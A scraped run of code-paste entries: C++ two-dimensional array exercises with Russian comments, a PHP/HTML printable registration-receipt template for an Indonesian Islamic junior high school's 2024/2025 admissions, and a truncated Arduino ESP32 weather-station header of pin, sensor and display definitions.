			if (arr[i][j] > max) {
				max = arr[i][j];
			}
		}
	}

	cout << ""Наибольший элемент в массиве - "" << max << endl;

}"
iShGMq5Q,Untitled,35657,C++,Friday 23rd of February 2024 09:51:03 PM CDT,"#include <iostream>

using namespace std;


int main() {

	int arr1[2][2];

	int arr2[2][2]{ {1,2}, {7,8} };

	int arr3[2][2]{ 1,2,7,8 };

	int arr4[3][3]{ {7,8}, {1,2,3} };

	const int row = 3; // количество строк

	const int col = 5; // количество столбцов

	int arr5[row][col];

	srand(time(NULL));

	for (int i = 0; i < row; i++) { // индекс строки
		for (int j = 0; j < col; j++) { // индекс столбца
			arr5[i][j] = rand() % 100;
		}
	}

	for (int i = 0; i < row; i++) {
		for (int j = 0; j < col; j++) {
			cout << arr5[i][j] << '\t';
		}
		cout << endl;
	}

}"
DAsvSuBY,View Bukti Pendaftaran,Frahman,PHP,Friday 23rd of February 2024 09:41:22 PM CDT,"<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Bukti Pendaftaran - <?= $siswa['nama_lengkap']; ?></title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            font-size: 9px;
        }

        #judul {
            padding: 1px;
            margin: 1px;
            font-size: 14px;
        }

        #isi {
            padding: 0px;
            margin: 0px;
        }

        .row {
            display: flex;
            justify-content: space-between;
            gap: 3px;
        }

        .subpage {
            padding-top: 1mm;
        }

        .page {
            width: 210mm;
            height: 297mm;
            min-height: 297mm;
            margin: 1mm auto;
            background: white;
        }

        @page {
            size: A4 portrait;
            margin: 0;
        }

        @media print {
            body * {
                visibility: hidden;
            }

            .page {
                margin: 0;
                border: initial;
                border-radius: initial;
                width: initial;
                min-height: initial;
                box-shadow: initial;
                background: initial;
                page-break-after: always;
                position: absolute;
                left: 0;
                top: 0;
            }

            .page,
            .page * {
                visibility: visible;
            }
        }
    </style>
</head>

<body>
    <div class=""page"" id=""page"">
        <div class=""subpage"" style=""margin-left: 5mm; margin-right: 5mm; "">
            <table>
                <tr>
                    <td>
                        <img src=""C:/laragon/www/ppdbmts/public/assets/dist/img/<?= $siswa['foto']; ?>"" width=""40px"" height=""60px"" alt="""">
                    </td>
                    <td>
                        <p id=""judul"">Penerimaan Peserta Didik Baru Online</p>
                        <p id=""judul"">MTsN 1 Lombok Timur</p>
                        <p id=""judul"">Tahun Pelajaran 2024/2025</p>
                    </td>

                </tr>
            </table>

            <!-- <table style=""border: 1px solid black; border-collapse: collapse; width: 100%;"">
                <tr>
                    <td style=""border: 1px solid black; border-collapse: collapse; width: 90%;"">
                        <p id=""isi"">TANDA BUKTI PENDAFTARAN</p>
                        <p id=""isi"">PENERIMAAN PESERTA DIDIK BARU</>
                        <p id=""isi"">TAHUN PELAJARAN 2024</>
                    </td>
                    <td>
                        <center>
                            Lembar <br>
                            <b>PANITIA</b>
                        </center>
                    </td>
                </tr>
            </table>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr>
                    <th style=""border: 1px solid black; border-collapse: collapse; text-align: left;"" colspan=""3"">
                        Info Pendaftaran
                    </th>
                </tr>
                <tr>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center; background-color: azure;"">Waktu Pendaftaran</td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center; background-color: azure"">Jalur Pendaftaran</td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center; background-color: azure"">Tanggal Verifikasi</td>
                </tr>
                <tr style=""height: 30px;"">
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;""><?= $siswa['create_at']; ?></td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;""><?= $siswa['jalur_masuk']; ?></td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;"">01 Maret 2024</td>
                </tr>
            </table>
            <div class=""row"">
                <table style=""border: 1px solid black; border-collapse: collapse; width: 20%; margin-top: 3px;"">
                    <tr style=""height: 20px;"">
                        <th style=""text-align: left;"">Foto Siswa</th>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;"">
                            <center>
                                <img src=""C:/laragon/www/ppdbmts/public/assets/dist/img/<?= $siswa['foto']; ?>"" width=""100px"" class=""img-fluid pad"">
                            </center>
                        </td>
                    </tr>
                </table>
                <table style=""border: 1px solid black; border-collapse: collapse; width: 50%; margin-top: 3px;"">
                    <tr style=""height: 20px;"">
                        <th style=""text-align: left;"">Biodata Siswa</th>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Nomor Pendaftaran</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['no_pendaftaran']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">NISN</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['nisn']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Nama Lengkap</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['nama_lengkap']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Jenis Kelamin</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['jenis_kelamin'] == ""L"" ? ""Laki-Laki"" : ""Perempuan""; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Tempat, Tanggal Lahir</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['tempat_lahir']; ?>, <?= tgl_indo($siswa['tgl_lahir']); ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Alamat Siswa</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['alamat']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Sekolah Asal</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['asal_sekolah']; ?></td>
                    </tr>
                </table>
                <table style=""border: 1px solid black; border-collapse: collapse; width: 30%; margin-top: 3px;"">
                    <tr style=""height: 20px;"">
                        <th style=""text-align: left;"">Data Nilai</th>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Raport</td>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Total Nilai</td>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Jumlah Mapel</td>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Rata-Rata</td>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black;"">Kelas 4 Ganjil</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_4_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_4_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_4_ganjil']; ?></td>
                    </tr>
                    <tr style=""background-color: bisque;"">
                        <td style=""border: 1px solid black;"">Kelas 4 Genap</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_4_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_4_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_4_genap']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black;"">Kelas 5 Ganjil</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_5_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_5_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_5_ganjil']; ?></td>
                    </tr>
                    <tr style=""background-color: bisque;"">
                        <td style=""border: 1px solid black;"">Kelas 5 Genap</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_5_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_5_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_5_genap']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black;"">Kelas 6 Ganjil</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_6_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_6_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_6_ganjil']; ?></td>
                    </tr>
                </table>
            </div>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr style=""height: 30px;"">
                    <td><b>PERINGATAN!</b> Siswa yang <b>TIDAK VERIFIKASI</b> sesuai dengan jadwal yang ditentukan dianggap <b>MENGUNDURKAN DIRI</b></td>
                </tr>
            </table>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr style=""height: 30px;"">
                    <th style=""text-align: left;"" colspan=""5"">Data Prestasi</th>
                </tr>
                <tr style=""background-color: antiquewhite;"">
                    <td style=""border: 1px solid black; width: 1%;"">No</td>
                    <td style=""border: 1px solid black;"">Jenis Prestasi</td>
                    <td style=""border: 1px solid black;"">Prestasi</td>
                    <td style=""border: 1px solid black;"">Tingkat</td>
                    <td style=""border: 1px solid black;"">Tahun</td>
                </tr>
                <?php $no = 1; ?>
                <?php foreach ($prestasi as $key => $value) { ?>
                    <tr>
                        <td style=""border: 1px solid black;""><?= $no++; ?></td>
                        <td style=""border: 1px solid black;""><?= strtoupper($value['jenis_prestasi']); ?></td>
                        <td style=""border: 1px solid black;""><?= $value['prestasi']; ?></td>
                        <td style=""border: 1px solid black;""><?= $value['tingkat']; ?></td>
                        <td style=""border: 1px solid black;""><?= $value['tahun']; ?></td>
                    </tr>
                <?php } ?>
            </table>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr>
                    <td style=""border: 1px solid black; width: 10%; vertical-align: text-top;"">
                        **Harap tulis nama lengkap di bawah tanda tangan
                    </td>
                    <td style=""border: 1px solid black; width: 30%;"">
                        a/n <b><?= $siswa['nama_lengkap']; ?></b> Menyetujui data diatas, <b>Ortu / Wali Siswa Terdaftar **)</b>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        (......................................................................)
                    </td>
                    <td style=""border: 1px solid black; width: 30%; vertical-align: text-bottom;"">
                        Menyetujui data diatas,<br>
                        <b>Siswa Terdaftar</b>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <?= $siswa['nama_lengkap']; ?>
                    </td>
                    <td style=""border: 1px solid black; width: 30%;"">
                        Lombok Timur, <?= tgl_indo(date('Y-m-d')); ?><br>
                        <b>Verifikator PPDB</b> **)
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        (......................................................................)
                    </td>
                </tr>
            </table> -->
        </div>
        <hr style=""border: 2px dashed red; margin-top: 20px;"">
        <!-- <div class=""subpage"" style=""margin-left: 5mm; margin-right: 5mm; "">
            <table>
                <tr>
                    <td>
                        <img src=""<?= site_url(); ?>assets/dist/img/<?= $setting['logo']; ?>"" height=""60px"" alt="""">
                    </td>
                    <td>
                        <p id=""judul"">Penerimaan Peserta Didik Baru Online</p>
                        <p id=""judul"">MTsN 1 Lombok Timur</p>
                        <p id=""judul"">Tahun Pelajaran 2024/2025</p>
                    </td>

                </tr>
            </table>

            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%;"">
                <tr>
                    <td style=""border: 1px solid black; border-collapse: collapse; width: 90%;"">
                        <p id=""isi"">TANDA BUKTI PENDAFTARAN</p>
                        <p id=""isi"">PENERIMAAN PESERTA DIDIK BARU</>
                        <p id=""isi"">TAHUN PELAJARAN 2024</>
                    </td>
                    <td>
                        <center>
                            Lembar <br>
                            <b>SISWA</b>
                        </center>
                    </td>
                </tr>
            </table>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr>
                    <th style=""border: 1px solid black; border-collapse: collapse; text-align: left;"" colspan=""3"">
                        Info Pendaftaran
                    </th>
                </tr>
                <tr>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center; background-color: azure;"">Waktu Pendaftaran</td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center; background-color: azure"">Jalur Pendaftaran</td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center; background-color: azure"">Tanggal Verifikasi</td>
                </tr>
                <tr style=""height: 30px;"">
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;""><?= $siswa['create_at']; ?></td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;""><?= $siswa['jalur_masuk']; ?></td>
                    <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;"">01 Maret 2024</td>
                </tr>
            </table>
            <div class=""row"">
                <table style=""border: 1px solid black; border-collapse: collapse; width: 20%; margin-top: 3px;"">
                    <tr style=""height: 20px;"">
                        <th style=""text-align: left;"">Foto Siswa</th>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black; border-collapse: collapse; text-align: center;"">
                            <center>
                                <img src=""<?= site_url(); ?>assets/dist/img/<?= $siswa['foto']; ?>"" width=""100px"" class=""img-fluid pad"">
                            </center>
                        </td>
                    </tr>
                </table>
                <table style=""border: 1px solid black; border-collapse: collapse; width: 50%; margin-top: 3px;"">
                    <tr style=""height: 20px;"">
                        <th style=""text-align: left;"">Biodata Siswa</th>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Nomor Pendaftaran</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['no_pendaftaran']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">NISN</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['nisn']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Nama Lengkap</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['nama_lengkap']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Jenis Kelamin</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['jenis_kelamin'] == ""L"" ? ""Laki-Laki"" : ""Perempuan""; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Tempat, Tanggal Lahir</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['tempat_lahir']; ?>, <?= tgl_indo($siswa['tgl_lahir']); ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Alamat Siswa</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['alamat']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border-top: 1px solid black; border-right: 0px; border-collapse: collapse; width: 35%; background-color: gainsboro; text-align: right; padding-right: 5px;"">Sekolah Asal</td>
                        <td style=""border-top: 1px solid black; border-collapse: collapse; padding-left: 5px;""><?= $siswa['asal_sekolah']; ?></td>
                    </tr>
                </table>
                <table style=""border: 1px solid black; border-collapse: collapse; width: 30%; margin-top: 3px;"">
                    <tr style=""height: 20px;"">
                        <th style=""text-align: left;"">Data Nilai</th>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Raport</td>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Total Nilai</td>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Jumlah Mapel</td>
                        <td style=""border: 1px solid black; text-align: center; background-color: aliceblue;"">Rata-Rata</td>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black;"">Kelas 4 Ganjil</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_4_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_4_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_4_ganjil']; ?></td>
                    </tr>
                    <tr style=""background-color: bisque;"">
                        <td style=""border: 1px solid black;"">Kelas 4 Genap</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_4_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_4_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_4_genap']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black;"">Kelas 5 Ganjil</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_5_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_5_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_5_ganjil']; ?></td>
                    </tr>
                    <tr style=""background-color: bisque;"">
                        <td style=""border: 1px solid black;"">Kelas 5 Genap</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_5_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_5_genap']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_5_genap']; ?></td>
                    </tr>
                    <tr>
                        <td style=""border: 1px solid black;"">Kelas 6 Ganjil</td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['total_6_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center;""><?= $siswa['mapel_6_ganjil']; ?></td>
                        <td style=""border: 1px solid black; text-align: center; font-weight: bold;""><?= $siswa['rata_6_ganjil']; ?></td>
                    </tr>
                </table>
            </div>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr style=""height: 30px;"">
                    <td><b>PERINGATAN!</b> Siswa yang <b>TIDAK VERIFIKASI</b> sesuai dengan jadwal yang ditentukan dianggap <b>MENGUNDURKAN DIRI</b></td>
                </tr>
            </table>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr style=""height: 30px;"">
                    <th style=""text-align: left;"" colspan=""5"">Data Prestasi</th>
                </tr>
                <tr style=""background-color: antiquewhite;"">
                    <td style=""border: 1px solid black; width: 1%;"">No</td>
                    <td style=""border: 1px solid black;"">Jenis Prestasi</td>
                    <td style=""border: 1px solid black;"">Prestasi</td>
                    <td style=""border: 1px solid black;"">Tingkat</td>
                    <td style=""border: 1px solid black;"">Tahun</td>
                </tr>
                <?php $no = 1; ?>
                <?php foreach ($prestasi as $key => $value) { ?>
                    <tr>
                        <td style=""border: 1px solid black;""><?= $no++; ?></td>
                        <td style=""border: 1px solid black;""><?= strtoupper($value['jenis_prestasi']); ?></td>
                        <td style=""border: 1px solid black;""><?= $value['prestasi']; ?></td>
                        <td style=""border: 1px solid black;""><?= $value['tingkat']; ?></td>
                        <td style=""border: 1px solid black;""><?= $value['tahun']; ?></td>
                    </tr>
                <?php } ?>
            </table>
            <table style=""border: 1px solid black; border-collapse: collapse; width: 100%; margin-top: 3px;"">
                <tr>
                    <td style=""border: 1px solid black; width: 10%; vertical-align: text-top;"">
                        **Harap tulis nama lengkap di bawah tanda tangan
                    </td>
                    <td style=""border: 1px solid black; width: 30%;"">
                        a/n <b><?= $siswa['nama_lengkap']; ?></b> Menyetujui data diatas, <b>Ortu / Wali Siswa Terdaftar **)</b>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        (......................................................................)
                    </td>
                    <td style=""border: 1px solid black; width: 30%; vertical-align: text-bottom;"">
                        Menyetujui data diatas,<br>
                        <b>Siswa Terdaftar</b>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <?= $siswa['nama_lengkap']; ?>
                    </td>
                    <td style=""border: 1px solid black; width: 30%;"">
                        Lombok Timur, <?= tgl_indo(date('Y-m-d')); ?><br>
                        <b>Verifikator PPDB</b> **)
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        (......................................................................)
                    </td>
                </tr>
            </table>
        </div> -->
    </div>
</body>

</html>
<!-- <script type=""text/javascript"">
    function myFunction() {
        var printContents = document.getElementById('page').innerHTML;
        var originalContents = document.body.innerHTML;
        document.body.innerHTML = printContents;
        window.print();
        document.body.innerHTML = originalContents;
    }
    window.onload = myFunction;
</script> -->"
Z69pbkBB,Declarations if needed for testing,Silverfire9,Arduino,Friday 23rd of February 2024 09:38:21 PM CDT,"#if defined(ESP32)						                                                // Program only runs on ESP32 - Has features unsupported by other microcontrollers
  #pragma message ""Compiling for ESP32""
#else
  #error Unsupported board! Only ESP32 is supported.
#endif

// Hardware option flags
#define OLEDDISPLAY					                                                  // 0.96"" I2C OLED display
#ifdef OLEDDISPLAY
  #pragma message ""Compiling with 128x64 OLED support""
#endif
#define TFTDISPLAY						                                                // 1.8"" SPI TFT display
#ifdef TFTDISPLAY
  #pragma message ""Compiling with 128x128 TFT support""
#endif

#define DS3231_RTC					                                                  // DS3231 ""best precision"" RTC chip
#ifdef DS3231_RTC
  #pragma message ""Compiling to use DS3231 RTC""
#else
  #define DS1307_RTC				                                                  // DS1307 ""good precision"" RTC chip
  #ifdef DS1307_RTC
    #pragma message ""Compiling to use DS1307 RTC""
  #endif
  #ifndef DS1307_RTC
    #pragma message ""Compiling without RTC support!""                          // Warn that there's no RTC
  #endif
#endif

// Compile-time option flags
//#define USEMDNS                                                               // Use mDNS to use hostname.local as a valid webserver address

// Serial debugging info flags
#define PREFSDEBUG						                                              // Preference saving/loading activity
//#define SETUPDEBUG						                                              // General setup function activity
//#define WIFIDEBUG						                                                // WiFi interface
//#define WEBDEBUG						                                                // Webserver interface activity
#ifdef OLEDDISPLAY
  //#define OLEDDEBUG						                                              // OLED display
#endif
#ifdef TFTDISPLAY
  //#define TFTDEBUG						                                              // TFT display
#endif
//#define TIMEDEBUG						                                                // Time-related activity (NTP/RTC/etc.)
#define MQTTDEBUG						                                                // MQTT interface
//#define DS18DEBUG						                                                // DS18B20 temperature sensor
//#define BME280DEBUG					                                                // BME280 temperature/humidity/pressure sensor (temperature not used - self-heating trouble)
//#define FEELDEBUG                                                           // RealFeel temperature
//#define WINDDIRDEBUG					                                              // Wind direction sensor
//#define WINDSPDDEBUG					                                              // Wind speed sensor
//#define RAINDEBUG						                                                // Rainfall sensor
//#define LUXDEBUG						                                                // Light level sensor - photoresistor
//#define UVDEBUG 						                                                // ML8511 UV sensor
//#define WEBDEBUG                                                            // Webserver and webpages
//#define SETUPDEBUG                                                          // General setup function activity
//#define LOOPDEBUG						                                                // General loop function activity

// Library includes
#include <Adafruit_ADS1X15.h>
#include <Adafruit_BME280.h>
#include <Adafruit_GFX.h>
#include <Adafruit_Sensor.h>
#ifdef OLEDDISPLAY
#include <Adafruit_SSD1306.h>
#endif
#ifdef TFTDISPLAY
#include <Adafruit_ST7735.h>
#endif
#include <ArduinoJson.h>
#include <AsyncElegantOTA.h>
#include <AsyncTCP.h>
#include <DallasTemperature.h>
#include <ESPAsyncWebServer.h>
#ifdef USEMDNS
//#include <ESPmDNS.h>
#endif
#include <OneWire.h>
#include <Preferences.h>
#include <PubSubClient.h>
#include <RTClib.h>
#include <SPIFFS.h>

// Define I2C addresses:
#define addrADS 0x48                                                        // ADS1015 sonsor I2C address
#define addrBME 0x77                                                        // BME280 sensor I2C address
#ifdef DS1307_RTC
#define addrRTC = 0xD0                                                      // DS1307 RTC I2C address
#endif
#ifdef DS3231_RTC
#define addrRTC 0x68                                                        // DS3231 RTC I2C address
#endif
#ifdef OLEDDISPLAY
#define DisplayAddr = 0x3C                                                  // OLED I2C address
#endif

// Define GPIO pin names = numbers
#define pinLED 5                                                            // Onboard LED
#define pinMOSI 13                                                          // Default SPI MOSI (SDA on dsplay) (defined in library)
#define pinSCK 14                                                           // Default SPI clock (SCL on display) (defined in library)
#define pinOneWire 16                                                       // One wire bus pin (for D18B20 temperature sensor)
#define pinCS 15                                                            // Default SPI cable select (CS on display)
#define pinRES 17                                                           // TFT screen reset (RES on display)
#define pinDC 18                                                            // TFT screen Data/Command select (DC on display)
#define PinSDA 21                                                           // Default I2C SDA (defined in library)
#define PinSCL 22                                                           // Default I2C SCL (defined in library)
#define pinBLK 23                                                           // TFT screen backlight - requires PWM (BLK on display)
#define pinBucket 25                                                        // Bucket (Digital)
#define pinAnemo 26                                                         // Anemometer (Digital)
#define pinPower 27                                                         // Detect power source (Digital)
#define pinDisplay 35                                                       // Display enable switch
// Define ADC inputs
#define pinADCRef 3                                                         // ADC Reference input                                ***Temproarily swapped with Lux for testing
#define pinADCUV 1                                                          // UV Sensor ADS input pin # (A#) (Analog)
#define pinADCLux 2                                                         // Photoresistor ADS input pin # (A#) (Analog)
#define pinADCVane 0                                                        // Wind Vane ADS input pin #  (A#) (Analog)           ***Temproarily swapped with Ref for testing

// Function constants
#ifdef OLEDDISPLAY
#define SCREEN_WIDTH 128                                                    // OLED display width, in pixels
#define SCREEN_HEIGHT 64                                                    // OLED display height, in pixels
#define OLED_RESET -1                                                       // OLED reset pin (-1 because it doesn't exist on this board)
#endif
#ifdef TFTDISPLAY
#define SCREEN_WIDTH_C 128                                                  // TFT display width, in pixels
#define SCREEN_HEIGHT_C 128                                                 // TFT display height, in pixels
#define channelPWM 0                                                        // PWM channel for backlight
#define freqPWM 1000                                                        // PWM freqeuency for backlight
#define CBLACK 0x0000                                                       // RGB565 value for black
#define CBLUE 0xF800                                                        // RGB565 value for blue
#define CSKYBLUE 0x867D                                                     // RGB565 value for sky blue
#define CRED 0xF800                                                         // BGR565 value for red
#define CGREEN 0x07E0                                                       // RGB565 value for green
#define CDKGREEN 0x2464                                                     // RGB565 value for dark green
#define CCYAN 0x07FF                                                        // RGB565 value for cyan
#define CYELLOW 0xFFE0                                                      // RGB565 value for yellow
#define CWHITE 0xFFFF                                                       // RGB565 value for white
#endif

// Data objects
typedef struct struct_cal  {                                        // Calibration settings
  float ds18CalOffset = 0;                                                    // DS18B20 temperature offset (1-point calibration)
  float ds18RawHi = 98.5;                                                     // DS18B20 calibration boiling water reading (2-point calibration)
  float ds18RawLo = 0.1;                                                      // DS18B20 temperature frozen water reading (2-point calibration)
  float ds18RefHi = 97.91;                                                    // DS18B20 temperature boiling water actual (2-point calibration)
  float ds18RefLo = 0.00;                                                     // DS18B20 temperature frozen water actual (2-point calibration)
  uint8_t reedDebounceTime = 150;                                             // Reed switch debouncing time in ms
  uint16_t luxThreshold = 825;                                                // Photoresistor day/night threshold
  uint16_t luxHysteresis = 413;                                               // Photoresistor threshold hysteresis
} struct_cal;
struct_cal calibrations;

typedef struct struct_wx  {                                         // Weather Data
  char timeStr[36] = ""Startup"";                                               // Timestamp (onboard/RTC time)
  char windDir[4];                                                            // Wind Direction (combined quadrants: 16 possibilities)
  float windGust = 0;                                                         // Gust speed (3 second reading)
  int speedIntervalCount = 0;                                                 // interval counter for windspeed
  uint16_t windCount[200];                                                    // 3 second reading array for averaging
  float windSpeed[6] = {0.0, 0.0, 0.0, 0.0, 0.0, 0.0};                        // Windspeed (km/h) (averaged over rolling 10 minutes)
  int anemoCount = 0;                                                         // Anemometer count
  float oldSpeed = 0;                                                         // Last speed for change detection
  float rainHr[24];                                                           // Rainfall (array for hourly - last 24)
  float rainDaily = 0.0;                                                      // Rainfall (rolling 24-hour total)
  float temperature = -70.0;                                                  // Temperature (deg C)
  char feelType[10] = ""Unaltered"";                                            // Type of feels-like adjustment
  float feelTemp = -40.0;                                                     // ""Feels-like"" temperature (deg C)
  float pressureRaw = 123.4;                                                  // Barometric Pressure (kPa)
  int8_t altitude = 670;                                                      // Sensor altitude for sea level pressure calculation
  float pressureSeaLvl = 123.4;                                               // Barometric pressure at sea level
  float humidity = -12.3;                                                     // Humidity (%)
  float dewpoint = -12.3;                                                     // Calculated Dewpoint
  float uvIndexV = 0;                                                         // Raw UV sensor voltage output
  uint8_t uvIndex = 15;                                                       // UV Index
  uint16_t uvReading = 12345;                                                 // Raw UV analog reading
  uint16_t rawLux = 12345;                                                    // Raw analog intensity reading
